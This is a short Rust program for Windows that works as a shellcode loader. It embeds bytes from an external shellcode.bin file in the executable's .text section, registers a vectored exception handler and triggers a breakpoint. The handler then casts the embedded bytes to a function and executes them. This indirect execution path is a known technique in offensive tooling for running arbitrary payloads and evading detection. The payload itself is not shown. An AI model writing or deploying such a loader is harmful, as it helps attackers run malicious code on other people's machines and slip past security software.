#![feature(breakpoint)]
use std::{arch::breakpoint, mem::transmute};

use windows_sys::Win32::{
    Foundation::EXCEPTION_BREAKPOINT,
    System::Diagnostics::Debug::{AddVectoredExceptionHandler, EXCEPTION_POINTERS},
};

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

type ShellcodeFn = unsafe extern "C" fn() -> ();

unsafe extern "system" fn vectored_handler(exceptioninfo: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exceptioninfo).ExceptionRecord).ExceptionCode == EXCEPTION_BREAKPOINT {
            println!("[+] Breakpoint hit, executing shellcode...");
            let shellcode_ptr = SHELLCODE.as_ptr() as *const ();
            let shellcode_fn: ShellcodeFn = transmute(shellcode_ptr);
            shellcode_fn();
        }
    }
    0
}

fn main() {
    unsafe {
        AddVectoredExceptionHandler(1, Some(vectored_handler));

        breakpoint();
    }
}
